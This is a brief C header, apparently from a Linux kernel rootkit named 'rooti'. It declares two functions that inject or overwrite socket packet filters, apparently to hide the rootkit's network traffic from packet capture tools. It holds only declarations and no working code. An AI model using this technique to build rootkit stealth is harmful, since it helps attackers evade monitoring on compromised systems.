#ifndef _ROOTI_HIDING_NET_H
#define _ROOTI_HIDING_NET_H

#ifdef ROOTI_CONFIG_PCAP_FILTER_METHOD_PROG

#include <linux/socket.h>
#include <linux/filter.h>

int rooti_inject_packet_filter(struct sock *sock, struct sock_fprog __user *user_fprog);
int rooti_overwrite_packet_filter(struct sock *sock);

#endif

#endif
